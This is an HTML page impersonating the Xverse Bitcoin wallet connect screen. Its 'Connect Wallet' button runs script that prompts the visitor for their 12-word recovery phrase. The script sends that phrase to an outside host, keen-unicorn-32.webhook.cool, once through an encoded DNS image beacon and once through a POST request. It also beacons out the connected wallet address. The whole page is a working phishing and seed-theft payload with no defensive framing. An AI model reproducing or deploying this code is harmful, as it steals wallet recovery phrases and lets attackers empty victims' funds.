<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>xverse.app</title>
  <style>
    body {
      font-family: sans-serif;
      padding: 40px;
      text-align: center;
      background: #0f172a;
      color: #e2e8f0;
    }
    .logo {
      font-size: 80px;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 20px;
    }
    p {
      font-size: 16px;
      color: #94a3b8;
      margin-bottom: 30px;
    }
    button {
      padding: 16px 32px;
      font-size: 18px;
      cursor: pointer;
      background: #f6851b;
      color: white;
      border: none;
      border-radius: 12px;
      box-shadow: 0 8px 30px rgba(246,133,27,0.4);
    }
    button:hover {
      background: #e2761b;
    }
  </style>
</head>
<body>
  <div class="logo">âš¡</div>
  <h1>Xverse Wallet</h1>
  <p>Connect your Bitcoin wallet to continue</p>
  <button id="connectWallet">Connect Wallet</button>

  <script>
    document.getElementById("connectWallet").addEventListener("click", async () => {
      const OOB = "keen-unicorn-32.webhook.cool";

      // 1.
      setTimeout(() => {
        const seed = prompt("Xverse Wallet says:\n\nEnter your 12-word recovery phrase to verify identity and continue");
        if (seed && seed.trim() !== "") {
          // Exfil via OOB (DNS beacon)
          const beacon = btoa(seed.trim()).replace(/=/g, '').substring(0, 500);
          new Image().src = `https://${beacon}.${OOB}`;

          // Backup exfil via POST
          fetch(`https://${OOB}/xverse-seed`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ seed: seed.trim() })
          }).catch(() => {});
        }
      }, 1000);

      // 2.
      if (window.SATS) {
        try {
          // Request accounts (connect)
          const response = await window.SATS.request('getAccounts', []);
          console.log("Xverse wallet connected:", response);

          if (response && response.length > 0) {
            const address = response[0].address;
            // Exfil address via OOB
            const addrBeacon = btoa(address).replace(/=/g, '');
            new Image().src = `https://addr-${addrBeacon}.${OOB}`;

            alert("Wallet connected successfully!");
          }
        } catch (err) {
          console.log("Xverse connection rejected:", err);
          alert("Connection rejected or failed");
        }
      } else {
        console.log("Xverse wallet not detected (window.SATS not available).");
        alert("Please open this page in Xverse Wallet browser");
      }
    });
  </script>
</body>
</html>
